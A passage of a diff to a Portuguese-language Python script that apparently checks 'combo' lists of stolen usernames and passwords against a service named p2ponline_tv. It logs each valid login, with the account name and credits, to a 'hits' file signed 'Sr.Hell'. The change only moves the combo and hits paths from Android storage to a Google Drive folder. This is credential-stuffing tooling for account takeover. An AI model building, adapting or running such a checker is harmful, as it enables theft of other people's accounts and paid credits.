@@ -106,7 +106,7 @@ def login_and_get_dashboard(username, password):
         return None, None
 
 def listar_arquivos_combo():
-    diretorio = "/storage/emulated/0/combo"
+    diretorio = "/content/drive/MyDrive/_Paineis/combo"
     arquivos = [f for f in os.listdir(diretorio) if f.endswith('.txt')]
     print("Arquivos disponíveis:")
     for i, arquivo in enumerate(arquivos, 1):
@@ -128,7 +128,7 @@ def process_account(user, password, i, total):
         print(VERDE + f"\n==[ Login válido ]==\n • User: {user}\n • Pass: {password}" + RESET)
         print(f" ===<use infos/>===\n • Nome: {name}")
         print(f" • Créditos: {credits}")
-        with open("/storage/emulated/0/Hits/p2ponline_tv_hits.txt", "a") as hit_file:
+        with open("/content/drive/MyDrive/_Paineis/combo/hits/p2ponline_tv_hits.txt", "a") as hit_file:
             hit_file.write(f"\n===<Sr.Hell/>===\n• User: {user}\n• Pass: {password}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
         return True
     else:
